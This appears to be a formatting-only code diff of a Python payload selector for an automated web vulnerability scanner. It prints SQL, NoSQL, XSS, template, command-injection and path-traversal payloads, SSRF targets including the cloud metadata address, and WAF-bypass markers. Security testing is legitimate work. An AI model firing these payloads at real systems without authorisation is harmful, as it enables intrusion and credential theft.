@@ -15,13 +15,13 @@ import tempfile
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Tuple
 
-from .types import PayloadStats, ScoredPayload, get_payload_hash, get_payload_key
 from .signatures import (
     TargetProfile,
-    detect_waf_from_dict,
     detect_db_from_dict,
     detect_framework_from_dict,
+    detect_waf_from_dict,
 )
+from .types import PayloadStats, ScoredPayload, get_payload_hash, get_payload_key
 
 logger = logging.getLogger(__name__)
 
@@ -223,16 +223,20 @@ class SmartPayloadSelector:
         # JSON/XML 格式的 SQL 注入
         content_type = str(target_info.get("content_type", "")).lower()
         if "json" in content_type:
-            payloads.extend([
-                '{"id":"1 OR 1=1--"}',
-                '{"id":"1\' OR \'1\'=\'1"}',
-                '{"id":{"$gt":""}}',
-            ])
+            payloads.extend(
+                [
+                    '{"id":"1 OR 1=1--"}',
+                    "{\"id\":\"1' OR '1'='1\"}",
+                    '{"id":{"$gt":""}}',
+                ]
+            )
         elif "xml" in content_type:
-            payloads.extend([
-                '<id>1\' OR \'1\'=\'1</id>',
-                '<id>1 UNION SELECT NULL--</id>',
-            ])
+            payloads.extend(
+                [
+                    "<id>1' OR '1'='1</id>",
+                    "<id>1 UNION SELECT NULL--</id>",
+                ]
+            )
 
         return payloads
 
@@ -261,13 +265,15 @@ class SmartPayloadSelector:
         payloads.extend(MegaPayloads.XSS.get("dom_based", []))
 
         # 补充 DOM XSS Payload
-        payloads.extend([
-            "javascript:alert(1)",
-            "#<script>alert(1)</script>",
-            "'-alert(1)-'",
-            "{{7*7}}",
-            "${alert(1)}",
-        ])
+        payloads.extend(
+            [
+                "javascript:alert(1)",
+                "#<script>alert(1)</script>",
+                "'-alert(1)-'",
+                "{{7*7}}",
+                "${alert(1)}",
+            ]
+        )
 
         return payloads
 
@@ -475,13 +481,14 @@ class SmartPayloadSelector:
     def _is_waf_bypass_payload(self, payload: str) -> bool:
         """检查是否为 WAF 绕过 Payload"""
         bypass_indicators = [
-            "/*!",      # MySQL 注释绕过
-            "%00",      # 空字节
-            "/**/",     # 注释
-            "%0a", "%0d",  # 换行
-            "\\u00",    # Unicode
-            "&#",       # HTML 实体
-            "%25",      # 双重编码
+            "/*!",  # MySQL 注释绕过
+            "%00",  # 空字节
+            "/**/",  # 注释
+            "%0a",
+            "%0d",  # 换行
+            "\\u00",  # Unicode
+            "&#",  # HTML 实体
+            "%25",  # 双重编码
         ]
         return any(ind in payload.lower() for ind in bypass_indicators)
 
@@ -515,6 +522,7 @@ class SmartPayloadSelector:
 
     def _sort_by_success_rate(self, payloads: List[str]) -> List[str]:
         """按成功率排序"""
+
         def get_rate(p: str) -> float:
             payload_hash = get_payload_hash(p)
             if payload_hash in self.stats:
@@ -527,8 +535,12 @@ class SmartPayloadSelector:
         """获取后备 Payload（当 MegaPayloads 不可用时）"""
         fallback = {
             "sqli": [
-                "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
-                "1' AND '1'='1", "admin'--", "' UNION SELECT NULL--",
+                "' OR '1'='1",
+                '" OR "1"="1',
+                "' OR 1=1--",
+                "1' AND '1'='1",
+                "admin'--",
+                "' UNION SELECT NULL--",
             ],
             "xss": [
                 "<script>alert(1)</script>",
@@ -541,7 +553,11 @@ class SmartPayloadSelector:
                 "php://filter/convert.base64-encode/resource=index.php",
             ],
             "rce": [
-                "; id", "| id", "& id", "`id`", "$(id)",
+                "; id",
+                "| id",
+                "& id",
+                "`id`",
+                "$(id)",
             ],
             "ssrf": [
                 "http://127.0.0.1",
@@ -549,7 +565,9 @@ class SmartPayloadSelector:
                 "http://169.254.169.254/latest/meta-data/",
             ],
             "nosql": [
-                '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
+                '{"$gt":""}',
+                '{"$ne":""}',
+                '{"$regex":".*"}',
             ],
         }
         return fallback.get(vuln_type, [])
